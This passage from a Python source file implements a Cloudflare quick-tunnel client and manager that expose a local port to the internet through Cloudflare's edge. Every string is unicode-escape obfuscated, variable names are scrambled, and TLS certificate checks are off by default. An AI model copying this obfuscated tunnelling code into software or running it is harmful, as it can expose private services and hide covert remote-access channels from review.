            self.sock = O0_fn_19(self.origin)
            self.send_handshake()
            response = http.client.HTTPResponse(self.sock, method=codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'))
            response.begin()
            O0_var_695 = response.getheaders()
            O0_var_696 = []
            O0_var_697 = []
            for O0_var_698, O0_var_699 in O0_var_695:
                O0_var_700 = O0_var_698.lower()
                if O0_var_700 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_697.append((O0_var_700, O0_var_699))
                if not (O0_var_700.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_700.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_700.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_700.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_700 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_696.append((O0_var_700, O0_var_699))
            O0_var_701 = O0_fn_18(O0_var_696)
            O0_var_702 = 200 if response.status == 101 else response.status
            O0_var_703 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_702))]
            O0_var_703.extend(O0_var_697)
            O0_var_703.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_701))
            O0_var_703.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.connection.send_headers(self.stream_id, O0_var_703)
            O0_var_694 = threading.Thread(target=self.write_to_origin, daemon=True)
            O0_var_694.start()
            while not self.stopped.is_set():
                O0_var_704 = self.sock.recv(65536)
                if not O0_var_704:
                    break
                self.connection.send_data(self.stream_id, O0_var_704, False)
            self.connection.send_data(self.stream_id, b'', True)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), self.stream_id, exc)
            try:
                self.connection.send_headers(self.stream_id, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass
        finally:
            self.stopped.set()
            self.incoming.put(None)
            if self.sock is not None:
                try:
                    self.sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    self.sock.close()
                except OSError:
                    pass

    def send_handshake(self):
        O0_var_705 = urlsplit(self.origin)
        O0_var_706 = self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')] if self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')].startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')]
        O0_var_707 = [codecs.decode('\\u0047\\u0045\\u0054\\u0020\\u0025\\u0073\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0031\\u002e\\u0031', 'unicode_escape') % O0_var_706]
        O0_var_708 = False
        O0_var_709 = False
        O0_var_710 = False
        for O0_var_711, O0_var_712 in self.request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
            O0_var_713 = O0_var_711.lower()
            if O0_var_713 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')}:
                continue
            if O0_var_713 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u006b\\u0065\\u0079', 'unicode_escape'):
                O0_var_708 = True
            elif O0_var_713 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'):
                O0_var_709 = True
            elif O0_var_713 == codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'):
                O0_var_710 = True
            O0_var_707.append(codecs.decode('\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_711, O0_var_712))
        O0_var_714 = O0_var_705.netloc
        O0_var_707.append(codecs.decode('\\u0048\\u006f\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_714)
        if not O0_var_710 and self.request.get(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')):
            O0_var_707.append(codecs.decode('\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u003a\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0025\\u0073', 'unicode_escape') % self.request[codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')])
        if not O0_var_708:
            O0_var_707.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % base64.b64encode(secrets.token_bytes(16)).decode())
        if not O0_var_709:
            O0_var_707.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u003a\\u0020\\u0031\\u0033', 'unicode_escape'))
        O0_var_707.append(codecs.decode('\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'))
        O0_var_707.append(codecs.decode('\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u003a\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'))
        self.sock.sendall((codecs.decode('\\u000d\\u000a', 'unicode_escape').join(O0_var_707) + codecs.decode('\\u000d\\u000a\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0069\\u0073\\u006f\\u002d\\u0038\\u0038\\u0035\\u0039\\u002d\\u0031', 'unicode_escape')))

    def write_to_origin(self):
        while not self.stopped.is_set():
            O0_var_715 = self.incoming.get()
            if O0_var_715 is None:
                return
            try:
                self.sock.sendall(O0_var_715)
            except OSError:
                self.stopped.set()
                return

class ControlStream:

    def __init__(self, O0_var_716, O0_var_717, logger):
        self.connection = O0_var_716
        self.stream_id = O0_var_717
        self.log = logger
        self.buffer = b''
        self.finished = False

    def start(self, O0_var_718, O0_var_719, O0_var_720, O0_var_721):
        self.connection.send_data(self.stream_id, O0_fn_9(0), False)
        self.connection.send_data(self.stream_id, O0_fn_10(1, 0, O0_var_718, O0_var_719, O0_var_720, O0_var_721), False)

    def feed(self, O0_var_722):
        self.buffer += O0_var_722
        O0_var_723, self.buffer = O0_fn_11(self.buffer)
        for O0_var_724 in O0_var_723:
            try:
                O0_var_725 = O0_fn_14(O0_var_724)
                if O0_var_725[codecs.decode('\\u006f\\u006b', 'unicode_escape')]:
                    self.log.info(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0065\\u0064\\u0020\\u0061\\u0074\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_725.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')))
                    self.connection.registered = True
                else:
                    self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_725.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))
            except Exception as exc:
                self.log.debug(codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0020\\u0052\\u0050\\u0043\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

def O0_fn_18(headers):
    O0_var_726 = []
    for O0_var_727, O0_var_728 in headers:
        O0_var_729 = base64.b64encode(O0_var_727.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_730 = base64.b64encode(O0_var_728.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_726.append(O0_var_729 + codecs.decode('\\u003a', 'unicode_escape') + O0_var_730)
    return codecs.decode('\\u003b', 'unicode_escape').join(O0_var_726)

def O0_fn_19(O0_var_731):
    O0_var_732 = urlsplit(O0_var_731)
    if O0_var_732.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_732.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_733 = O0_var_732.port or (443 if O0_var_732.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_734 = socket.create_connection((O0_var_732.hostname, O0_var_733), timeout=30)
    if O0_var_732.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_735 = ssl.create_default_context()
        O0_var_734 = O0_var_735.wrap_socket(O0_var_734, server_hostname=O0_var_732.hostname)
    O0_var_734.settimeout(None)
    return O0_var_734

def O0_fn_20(O0_var_736, method, O0_var_737, O0_var_738, body):
    O0_var_739 = urlsplit(O0_var_736)
    if O0_var_739.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_739.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_740 = O0_var_739.port or (443 if O0_var_739.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_741 = http.client.HTTPConnection(O0_var_739.hostname, O0_var_740, timeout=30)
    if O0_var_739.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_741 = http.client.HTTPSConnection(O0_var_739.hostname, O0_var_740, timeout=30)
    O0_var_742 = {}
    for O0_var_743, O0_var_744 in O0_var_738:
        O0_var_745 = O0_var_743.lower()
        if O0_var_745 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')}:
            continue
        O0_var_742[O0_var_743] = O0_var_744
    O0_var_742[codecs.decode('\\u0048\\u006f\\u0073\\u0074', 'unicode_escape')] = O0_var_739.netloc
    if body:
        O0_var_742[codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u004c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(body))
    O0_var_746 = O0_var_737 if O0_var_737.startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + O0_var_737
    O0_var_741.request(method, O0_var_746, body=body or None, headers=O0_var_742)
    response = O0_var_741.getresponse()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): response.status, codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): response.getheaders(), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): response}

def O0_fn_21(O0_var_747, O0_var_748):
    O0_var_749 = []
    O0_var_750 = O0_var_748
    while O0_var_750:
        O0_var_751 = O0_var_747.recv(O0_var_750)
        if not O0_var_751:
            raise EOFError(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape'))
        O0_var_749.append(O0_var_751)
        O0_var_750 -= len(O0_var_751)
    return b''.join(O0_var_749)

def O0_fn_22(O0_var_752, logger):
    O0_var_753 = list(EDGE_HOSTS)
    secrets.SystemRandom().shuffle(O0_var_753)
    O0_var_754 = None
    for O0_var_755 in O0_var_753:
        O0_var_756 = None
        O0_var_757 = None
        try:
            O0_var_756 = socket.create_connection((O0_var_755, EDGE_PORT), timeout=10)
            O0_var_758 = ssl.create_default_context() if O0_var_752 else ssl._create_unverified_context()
            O0_var_758.set_alpn_protocols([codecs.decode('\\u0068\\u0032', 'unicode_escape')])
            O0_var_757 = O0_var_758.wrap_socket(O0_var_756, server_hostname=codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
            if O0_var_757.selected_alpn_protocol() not in {None, codecs.decode('\\u0068\\u0032', 'unicode_escape')}:
                raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u006e\\u0065\\u0067\\u006f\\u0074\\u0069\\u0061\\u0074\\u0065\\u0020\\u0068\\u0032', 'unicode_escape'))
            O0_var_757.settimeout(None)
            logger.info(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064', 'unicode_escape'), O0_var_755, EDGE_PORT)
            return O0_var_757
        except (OSError, ssl.SSLError) as exc:
            O0_var_754 = exc
            if O0_var_757 is not None:
                O0_var_757.close()
            elif O0_var_756 is not None:
                O0_var_756.close()
            logger.warning(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_755, exc)
    raise OSError(codecs.decode('\\u0061\\u006c\\u006c\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0020\\u0065\\u0064\\u0067\\u0065\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_754)

class _ArgoLogAdapter:

    @staticmethod
    def _format(message, args):
        return message % args if args else message

    def debug(self, message, *args):
        Logger.debug(self._format(message, args))

    def info(self, message, *args):
        Logger.info(self._format(message, args))

    def warning(self, message, *args):
        Logger.warning(self._format(message, args))

    def error(self, message, *args):
        Logger.error(self._format(message, args))

class CloudflareQuickTunnel:

    def __init__(self, port, logger=None, O0_var_759=QUICK_SERVICE, O0_var_760=2.0, O0_var_761=False):
        self.port = port
        self.origin = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064', 'unicode_escape') % port
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.quick_service = O0_var_759
        self.retry_seconds = O0_var_760
        self.verify_certificate = O0_var_761
        self.hostname = None
        self.created_at = None
        self._stop = threading.Event()
        self._thread = None
        self._sock = None
        self._tunnel_state = {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return self.hostname
        O0_var_762, O0_var_763, O0_var_764, O0_var_765 = O0_fn_17(self.quick_service)
        self.hostname = O0_var_762 if O0_var_762.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_762
        self.created_at = int(time.time())
        self._stop.clear()
        self._sock = None
        self._thread = threading.Thread(target=self._run_loop, args=(O0_var_763, O0_var_764, O0_var_765), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002d\\u0025\\u0064', 'unicode_escape') % self.port)
        self._thread.start()
        return self.hostname

    def _run_loop(self, O0_var_766, O0_var_767, O0_var_768):
        while not self._stop.is_set():
            O0_var_769 = None
            try:
                O0_var_769 = O0_fn_22(self.verify_certificate, self.log)
                self._sock = O0_var_769
                H2Connection(O0_var_769, self.origin, O0_var_766, O0_var_767, O0_var_768, 0, self.log, self.hostname, True, self._tunnel_state).run()
            except KeyboardInterrupt:
                return
            except (OSError, EOFError, ValueError) as exc:
                self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
            finally:
                if O0_var_769 is not None:
                    try:
                        O0_var_769.close()
                    except OSError:
                        pass
                self._sock = None
            if self._stop.is_set():
                return
            self._stop.wait(self.retry_seconds)

    def stop(self):
        self._stop.set()
        O0_var_770 = self._sock
        if O0_var_770 is not None:
            try:
                O0_var_770.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                O0_var_770.close()
            except OSError:
                pass
        if self._thread is not None:
            self._thread.join(timeout=2)

class ArgoTunnelError(Exception):

    def __init__(self, status_code, message):
        super().__init__(message)
        self.status_code = status_code
        self.message = message

class ArgoTunnelManager:

    def __init__(self, logger=None):
        self._tunnels = []
        self._by_port = {}
        self._lock = threading.Lock()
        self.log = logger if logger is not None else _ArgoLogAdapter()

    def list_tunnels(self):
        with self._lock:
            return [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_771.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_771.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_771.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_771 in self._tunnels if O0_var_771.hostname is not None]

    def create_tunnel(self, port, duplicate=False):
        with self._lock:
            if self._by_port.get(port) and (not duplicate):
                raise ArgoTunnelError(409, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape') % port)
        O0_var_772 = CloudflareQuickTunnel(port=port, logger=self.log)
        try:
            O0_var_772.start()
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), port, exc)
            raise ArgoTunnelError(500, codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
        with self._lock:
            self._tunnels.append(O0_var_772)
            self._by_port.setdefault(port, []).append(O0_var_772)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): True, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_772.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_772.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))}

    def delete_tunnel(self, port, tunnel_domain=None):
        with self._lock:
            O0_var_773 = self._by_port.get(port) or []
            if not O0_var_773:
                raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064', 'unicode_escape') % port)
            if tunnel_domain is not None:
                O0_var_774 = [O0_var_775 for O0_var_775 in O0_var_773 if O0_var_775.hostname == tunnel_domain]
                if not O0_var_774:
                    raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0025\\u0073', 'unicode_escape') % (port, tunnel_domain))
            elif len(O0_var_773) > 1:
                raise ArgoTunnelError(409, codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u006c\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0070\\u0065\\u0063\\u0069\\u0066\\u0079\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u006f\\u0020\\u0064\\u0069\\u0073\\u0061\\u006d\\u0062\\u0069\\u0067\\u0075\\u0061\\u0074\\u0065', 'unicode_escape') % port)
            else:
                O0_var_774 = list(O0_var_773)
            O0_var_776 = [O0_var_777 for O0_var_777 in O0_var_773 if O0_var_777 not in O0_var_774]
            if O0_var_776:
                self._by_port[port] = O0_var_776
            else:
                self._by_port.pop(port, None)
            self._tunnels = [O0_var_778 for O0_var_778 in self._tunnels if O0_var_778 not in O0_var_774]
            O0_var_779 = [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_780.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_780.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_780.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_780 in O0_var_774]
        for O0_var_781 in O0_var_774:
            O0_var_781.stop()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_774), codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_779}

    def stop_all(self):
        with self._lock:
            O0_var_782 = list(self._tunnels)
            self._tunnels.clear()
            self._by_port.clear()
        for O0_var_783 in O0_var_782:
            O0_var_783.stop()

class ArgoTunnelInfo(BaseModel):
